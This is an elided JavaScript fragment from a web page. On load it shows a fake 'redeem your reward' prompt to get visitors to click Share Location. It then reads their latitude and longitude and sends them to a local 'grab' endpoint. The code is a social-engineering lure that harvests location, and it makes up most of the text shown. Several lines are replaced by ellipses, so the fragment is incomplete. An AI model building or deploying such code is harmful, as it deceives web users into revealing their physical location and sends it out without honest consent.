...
window.onload=function() {
  ...
  alert("Click Share Location to redeem your reward");
  ...
  // Browser doesn't support Geolocation
   ...
   function setPosition(position){
	...
	var eDiv=document.getElementById("status_1");
	while (eDiv.hasChildNodes()) {
			eDiv.removeChild(eDiv.lastChild);
		}
	 new Ajax.Updater('status_1','http://localhost:8888/beta/grab',{method: 'get', parameters: { latitude: position.coords.latitude, longitude: position.coords.longitude }});
